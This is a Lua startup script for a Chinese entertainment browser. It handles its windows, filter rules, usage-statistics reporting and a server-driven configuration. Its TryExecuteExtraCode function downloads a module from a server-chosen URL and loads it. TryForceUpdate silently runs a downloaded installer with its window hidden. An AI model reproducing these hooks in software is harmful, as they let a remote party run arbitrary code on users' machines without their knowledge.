local tipUtil = XLGetObject("API.Util")
local tipAsynUtil = XLGetObject("API.AsynUtil")
local gnLastReportRunTmUTC = 0

-----------------

function RegisterFunctionObject()
	local strFunhelpPath = __document.."\\..\\functionhelper.lua"
	XLLoadModule(strFunhelpPath)
	
	local tFunH = XLGetGlobal("YBYL.FunctionHelper")
	if type(tFunH) ~= "table" then
		return false
	else
		return true
	end
end


function LoadIEHelper()
	local strIEHelperPath = __document.."\\..\\IEMenuHelper.lua"
	XLLoadModule(strIEHelperPath)
end


function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end


function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end

function ShowMainTipWnd(objMainWnd)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	objMainWnd:Show(5)
	objMainWnd:SetTitle("元宝娱乐浏览器")
	SendStartupReport(true)
	FunctionObj.SetWindowMax()
end


function InitAdvFilter()
	SendRuleListtToFilterThread()
	SetWebRoot()
	InitFilterState()
end


function InitFilterState()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bOpenFilter = FunctionObj.GetFilterState()
	FunctionObj.SetFilterState(bOpenFilter)
end


function SendStartupReport(bShowWnd)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tStatInfo = {}
	
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	tStatInfo.strEL = strSource or ""
	
	if not bShowWnd then
		tStatInfo.strEC = "startup"  --进入上报
		tStatInfo.strEA = FunctionObj.GetMinorVer() or ""
	else
		tStatInfo.strEC = "showui" 	 --展示上报
		tStatInfo.strEA = FunctionObj.GetInstallSrc() or ""
	end
	
	tStatInfo.strEV = 1
	FunctionObj.TipConvStatistic(tStatInfo)
end


-- function InitAdvFilter()
	-- EncryptLazyFile("VideoRule_out.mingwen") 

	-- SendRuleListtToFilterThread()
	-- SetWebRoot()
	-- InitFilterState()
-- end


-- function EncryptLazyFile(strFileName) 
		-- local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	-- local strLazyListPath = FunctionObj.GetCfgPathWithName(strFileName)
	-- if not IsRealString(strLazyListPath) or not tipUtil:QueryFileExists(strLazyListPath) then
		-- XLMessageBox("file not exists:"..tostring(strFileName))
		-- return false
	-- end

	-- local strAESString = tipUtil:ReadFileToString(strLazyListPath)
	-- if not strAESString then
		-- TipLog("[SendLazyListToFilterThread] ReadFileToString failed : "..tostring(strLazyListPath))
		-- return false
	-- end
	
	-- local strEncName = strFileName..".enc"
	-- local strEncFilePath = FunctionObj.GetCfgPathWithName(strEncName)
	-- local strKey = "7uxSw0inyfnTawtg"
	-- tipUtil:EncryptAESToFile(strEncFilePath, strAESString, strKey)
	
	-- return
-- end



function GenDecFilePath(strEncFilePath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strKey = "7uxSw0inyfnTawtg"
	local strDecString = tipUtil:DecryptFileAES(strEncFilePath, strKey)
	if type(strDecString) ~= "string" then
		FunctionObj.TipLog("[GenDecFilePath] DecryptFileAES failed : "..tostring(strEncFilePath))
		return ""
	end
	
	local strTmpDir = tipUtil:GetSystemTempPath()
	if not tipUtil:QueryFileExists(strTmpDir) then
		FunctionObj.TipLog("[GenDecFilePath] GetSystemTempPath failed strTmpDir: "..tostring(strTmpDir))
		return ""
	end
	
	local strCfgName = tipUtil:GetTmpFileName() or "data.dat"
	local strCfgPath = tipUtil:PathCombine(strTmpDir, strCfgName)
	tipUtil:WriteStringToFile(strCfgPath, strDecString)
	return strCfgPath
end


function GetVideoRulePath()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strServerVideoRulePath = FunctionObj.GetCfgPathWithName("ServerYBYLVideo.dat")
	if IsRealString(strServerVideoRulePath) and tipUtil:QueryFileExists(strServerVideoRulePath) then
		return strServerVideoRulePath
	end

	local strVideoRulePath = FunctionObj.GetCfgPathWithName("YBYLVideo.dat")
	if IsRealString(strVideoRulePath) and tipUtil:QueryFileExists(strVideoRulePath) then
		return strVideoRulePath
	end
	
	return ""
end


function CheckForceVersion(tForceVersion)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	if type(tForceVersion) ~= "table" then
		return false
	end

	local bRightVer = false
	
	local strCurVersion = FunctionObj.GetYBYLVersion()
	local _, _, _, _, _, strCurVersion_4 = string.find(strCurVersion, "(%d+)%.(%d+)%.(%d+)%.(%d+)")
	local nCurVersion_4 = tonumber(strCurVersion_4)
	if type(nCurVersion_4) ~= "number" then
		return bRightVer
	end
	for iIndex = 1, #tForceVersion do
		local strRange = tForceVersion[iIndex]
		local iPos = string.find(strRange, "-")
		if iPos ~= nil then
			local lVer = tonumber(string.sub(strRange, 1, iPos - 1))
			local hVer = tonumber(string.sub(strRange, iPos + 1))
			if lVer ~= nil and hVer ~= nil and nCurVersion_4 >= lVer and nCurVersion_4 <= hVer then
				bRightVer = true
				break
			end
		else
			local verFlag = tonumber(strRange)
			if verFlag ~= nil and nCurVersion_4 == verFlag then
				bRightVer = true
				break
			end
		end
	end
	
	return bRightVer
end


function TryForceUpdate(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	if FunctionObj.CheckIsUpdating() then
		FunctionObj.TipLog("[TryForceUpdate] CheckIsUpdating failed,another thread is updating!")
		return
	end

	local bPassCheck = FunctionObj.CheckCommonUpdateTime(1)
	if not bPassCheck then
		FunctionObj.TipLog("[TryForceUpdate] CheckCommonUpdateTime failed")
		return		
	end

	local tNewVersionInfo = tServerConfig["tNewVersionInfo"] or {}
	local tForceUpdate = tNewVersionInfo["tForceUpdate"]
	if(type(tForceUpdate)) ~= "table" then
		return 
	end
	
	local strCurVersion = FunctionObj.GetYBYLVersion()
	local strNewVersion = tForceUpdate.strVersion		
	if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
		or not FunctionObj.CheckIsNewVersion(strNewVersion, strCurVersion) then
		return
	end
	
	local tVersionLimit = tForceUpdate["tVersion"]
	local bPassCheck = CheckForceVersion(tVersionLimit)
	FunctionObj.TipLog("[TryForceUpdate] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
	if not bPassCheck then
		return 
	end
	
	FunctionObj.SetIsUpdating(true)
	
	FunctionObj.DownLoadNewVersion(tForceUpdate, function(strRealPath) 
		FunctionObj.SetIsUpdating(false)
	
		if not IsRealString(strRealPath) then
			return
		end
		
		FunctionObj.SaveCommonUpdateUTC()
		local strCmd = " /write /silent /run"
		tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
	end)
end


function TryExecuteExtraCode(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
	local strURL = tExtraHelper["strURL"]
	local strMD5 = tExtraHelper["strMD5"]
	
	if not IsRealString(strURL) then
		return
	end
	local strHelperName = FunctionObj.GetFileSaveNameFromUrl(strURL)
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
	
	FunctionObj.DownLoadFileWithCheck(strURL, strSavePath, strMD5
	, function(bRet, strRealPath)
		FunctionObj.TipLog("[TryExecuteExtraCode] strURL:"..tostring(strURL)
		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
				
		if bRet < 0 then
			return
		end
		
		FunctionObj.TipLog("[TryExecuteExtraCode] begin execute extra helper")
		XLLoadModule(strRealPath)
	end)	
end


function FixUserConfig(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tUserConfigInServer = tServerConfig["tUserConfigInServer"]
	if type(tUserConfigInServer) ~= "table" then
		return
	end

	local tLocalUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	tLocalUserConfig["nMaxUrlHistroy"] = tUserConfigInServer["nMaxUrlHistroy"] or 100
	tLocalUserConfig["nMaxUserCollect"] = tUserConfigInServer["nMaxUserCollect"] or 100
		
	if IsRealString(tUserConfigInServer["strOpenTabURL"]) then
		tLocalUserConfig["strOpenTabURL"] = tUserConfigInServer["strOpenTabURL"]
	end
	
	if type(tUserConfigInServer["tOpenStupURL"]) == "table" and #tUserConfigInServer["tOpenStupURL"] >1 then
		tLocalUserConfig["tOpenStupURL"] = tUserConfigInServer["tOpenStupURL"]
	end
	
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function CheckServerRuleFile(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tServerData = FetchValueByPath(tServerConfig, {"tServerData"}) or {}
	
	local strServerVideoURL = FetchValueByPath(tServerData, {"tServerYBYLVideo", "strURL"})
	local strServerVideoMD5 = FetchValueByPath(tServerData, {"tServerYBYLVideo", "strMD5"})
	
	if not IsRealString(strServerVideoURL) or not IsRealString(strServerVideoMD5) then
		FunctionObj.TipLog("[CheckServerRuleFile] get server rule info failed , start tipmain ")
		
		-- TipMain()
		return
	end
	
	local strVideoSavePath = FunctionObj.GetCfgPathWithName("ServerYBYLVideo.dat")
	if not IsRealString(strVideoSavePath) or not tipUtil:QueryFileExists(strVideoSavePath) then
		strVideoSavePath = FunctionObj.GetCfgPathWithName("YBYLVideo.dat")
	end
		
	local strDataVMD5 = tipUtil:GetMD5Value(strVideoSavePath)
	if tostring(strDataVMD5) == strServerVideoMD5 then
		-- TipMain()
		return
	end

	local strPath = FunctionObj.GetCfgPathWithName("ServerYBYLVideo.dat")
	FunctionObj.NewAsynGetHttpFile(strServerVideoURL, strPath, false
		, function(bRet, strVideoPath)
			FunctionObj.TipLog("[DownLoadServerRule] bRet:"..tostring(bRet)
					.." strVideoPath:"..tostring(strVideoPath))
				
			FunctionObj.TipLog("[DownLoadServerRule] download finish, start tipmain ")
			-- TipMain()
			
		end, 5*1000)
end


function AnalyzeServerConfig(nDownServer, strServerPath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
		FunctionObj.TipLog("[AnalyzeServerConfig] Download server config failed , start tipmain ")
		-- TipMain()
		return	
	end
	
	local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
	TryForceUpdate(tServerConfig)
	FixUserConfig(tServerConfig)
	CheckServerRuleFile(tServerConfig)
	TryExecuteExtraCode(tServerConfig)
end


function SendRuleListtToFilterThread()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strVideoRulePath = GetVideoRulePath()
	if not IsRealString(strVideoRulePath) or not tipUtil:QueryFileExists(strVideoRulePath) then
		return false
	end

	local strDecVideoRulePath = GenDecFilePath(strVideoRulePath)
	if not IsRealString(strDecVideoRulePath) then
		return false	
	end
	local bSucc = tipUtil:LoadVideoRules(strDecVideoRulePath)
	if not bSucc then
		FunctionObj.TipLog("[SendRuleListtToFilterThread] LoadVideoRules failed")
		return false
	end
	
	tipUtil:DeletePathFile(strDecVideoRulePath)
	
	return true
end


function SetWebRoot()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strBrowserExePath = FunctionObj.GetExePath()
	local strWebRootDir = tipUtil:PathCombine(strBrowserExePath, "..\\..\\filterres")
	
	if not IsRealString(strWebRootDir) or not tipUtil:QueryFileExists(strWebRootDir) then
		FunctionObj.TipLog("[SetWebRoot] get WebRoot failed")
		return
	end
	
	tipUtil:FYbSetWebRoot(strWebRootDir)
end


function StartRunCountTimer()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local nTimeSpanInSec = 10 * 60 
	local nTimeSpanInMs = nTimeSpanInSec * 1000
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
		FunctionObj.SendRunTimeReport(nTimeSpanInSec, false)
		XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
	end, nTimeSpanInMs)
end


--弹出窗口--
local g_tPopupWndList = {
	[1] = {"TipAboutWnd", "TipAboutTree"},
	-- [2] = {"TipIntroduceWnd", "TipIntroduceTree"},
	-- [3] = {"TipConfigWnd", "TipConfigTree"},
}


function CreatePopupTipWnd()
	for key, tItem in pairs(g_tPopupWndList) do
		local strHostWndName = tItem[1]
		local strTreeName = tItem[2]
		local bSucc = CreateWndByName(strHostWndName, strTreeName)
	end
	
	return true
end

function CreateWndByName(strHostWndName, strTreeName)
	local bSuccess = false
	local strInstWndName = strHostWndName..".Instance"
	local strInstTreeName = strTreeName..".Instance"
	
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate(strHostWndName, "HostWndTemplate" )
	if frameHostWndTemplate then
		local frameHostWnd = frameHostWndTemplate:CreateInstance(strInstWndName)
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate(strTreeName, "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance(strInstTreeName)
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local iRet = frameHostWnd:Create()
					if iRet ~= nil and iRet ~= 0 then
						bSuccess = true
					end
				end
			end
		end
	end

	return bSuccess
end

function DestroyPopupWnd()
	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")

	for key, tItem in pairs(g_tPopupWndList) do
		local strPopupWndName = tItem[1]
		local strPopupInst = strPopupWndName..".Instance"
		
		local objPopupWnd = hostwndManager:GetHostWnd(strPopupInst)
		if objPopupWnd then
			hostwndManager:RemoveHostWnd(strPopupInst)
		end
	end
end


function PopTipWnd(OnCreateFunc)
	local bSuccess = false
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate("TipMainWnd", "HostWndTemplate" )
	local frameHostWnd = nil
	if frameHostWndTemplate then
		frameHostWnd = frameHostWndTemplate:CreateInstance("YBYLTipWnd.MainFrame")
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate("TipPanelTree", "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance("YBYLTipWnd.MainObjectTree")
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local ret = OnCreateFunc(uiObjectTree)
					if ret then
						local iRet = frameHostWnd:Create()
						if iRet ~= nil and iRet ~= 0 then
							bSuccess = true
							ShowMainTipWnd(frameHostWnd)
						end
					end
				end
			end
		end
	end
	if not bSuccess then
		local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
		FunctionObj:FailExitTipWnd(4)
	end
end


function TryOpenURLWhenStup()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strCmd = tipUtil:GetCommandLine()
	
	if string.find(strCmd, "/noopenstup") then
		return
	end
	
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	local tOpenStupURL = tUserConfig["tOpenStupURL"]
	if type(tOpenStupURL) ~= "table" then
		return
	end
	
	for key, strURL in pairs(tOpenStupURL) do
		if IsRealString(strURL) then
			FunctionObj.OpenURLInNewTab(strURL)
		end
	end
end


function ProcessCommandLine()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local bRet, strURL = FunctionObj.GetCommandStrValue("/openlink")
	if bRet and IsRealString(strURL) then
		FunctionObj.OpenURLInNewTab(strURL)
	end
	
	TryOpenURLWhenStup()
end


function CreateMainTipWnd()
	local function OnCreateFuncF(treectrl)
		local rootctrl = treectrl:GetUIObject("root.layout:root.ctrl")
		local bRet = rootctrl:SetTipData()			
		if not bRet then
			return false
		end
	
		return true
	end
	PopTipWnd(OnCreateFuncF)	
end


function TipMain() 
	InitAdvFilter()
	
	CreateMainTipWnd()
	CreatePopupTipWnd()
	ProcessCommandLine()
end


function PreTipMain() 
	gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
	XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
	
	if not RegisterFunctionObject() then
		tipUtil:Exit("Exit")
	end
	StartRunCountTimer()

	LoadIEHelper()	
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
	FunctionObj.ReadAllConfigInfo()
	
	SendStartupReport(false)
	TipMain()
	
	FunctionObj.DownLoadServerConfig(AnalyzeServerConfig)
end

PreTipMain()



